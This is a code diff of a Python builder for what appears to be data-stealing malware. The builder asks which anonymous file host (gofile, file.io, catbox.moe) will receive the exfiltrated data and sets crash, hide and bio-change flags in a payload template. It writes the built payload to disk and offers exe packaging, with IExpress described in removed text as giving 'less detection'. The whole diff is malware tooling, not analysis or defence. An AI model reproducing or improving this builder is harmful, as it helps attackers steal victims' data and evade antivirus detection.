@@ -154,31 +154,22 @@ while True:
         crasher = False
         
     while True:
-        service = input('Which upload services you want to use? (Choose between gofileio, anonymfilecom, fileio, catboxmoe) (you can choose with 1,2,3,4 too) :')
+        service = input('Which upload services you want to use? (Choose between gofileio, fileio, catboxmoe) (you can choose with 1,2,3 too) :')
         
-        if service.lower() in ['gofile', 'anonymousfile', 'fileio','1','2','3']:
+        if service.lower() in ['gofile', 'catboxmoe', 'fileio','1','2','3']:
             if service.lower() == 'gofile' or service.lower() == '1':
                 gofile = True
-                anonymousfile = False
                 fileio = False
                 catbox = False
                 break
-            elif service.lower() == 'anonymfilecom' or service.lower() == '2':
-                anonymousfile = True
-                fileio = False
-                gofile = False
-                catbox = False
-                break
-            elif service.lower() == 'fileio' or service.lower() == '3':
+            elif service.lower() == 'fileio' or service.lower() == '2':
                 fileio = True
-                anonymousfile = False
                 gofile = False
                 catbox = False
                 break
-            elif service.lower() == 'catboxmoe' or service.lower() == '4':
+            elif service.lower() == 'catboxmoe' or service.lower() == '3':
                 catbox = True
                 fileio = False
-                anonymousfile = False
                 gofile = False
                 break
             else:
@@ -212,7 +203,6 @@ while True:
     new_content = new_content.replace("'%Crash%'", str(crasher))
     new_content = new_content.replace("'%Hide%'", str(hide))
     new_content = new_content.replace("'%ChangeBio%'", str(change))
-    new_content = new_content.replace("'%AnonymousYesOrNo%'", str(anonymousfile))
     new_content = new_content.replace("'%GoFileYesOrNo%'", str(gofile))
     new_content = new_content.replace("'%FileIOYesOrNo%'", str(fileio))
     new_content = new_content.replace("'%CatBoxMoeYesOrNo%'", str(catbox))
@@ -250,6 +240,9 @@ while True:
                     print("Error: Unable to decode 'main.py' file. Please ensure it's UTF-8 encoded.")
                     quit()
                 print(f'[+] File Created {name}.py')
+                with open(f'./Build/{name}.py', 'w', encoding='utf-8') as file:
+                    file.write(new_content)
+                
                 if Exe in ['y', 'yes']:
                     pass
                 else:
@@ -263,7 +256,7 @@ while True:
     while True:
         if Exe in ['y', 'yes']:
             
-            ask = input('Do you want to make it exe with pyinstaller or with IExpress? (Yes if pyinstaller) (No if IExpress (Less detection)')
+            ask = input('Do you want to make it exe with pyinstaller or with IExpress? (Yes if pyinstaller) (No if IExpress)')
             if ask in ["yes","y"]:
                 from sys import executable
                 icon_path = input('Enter the path to the icon file (leave blank for no icon): ')
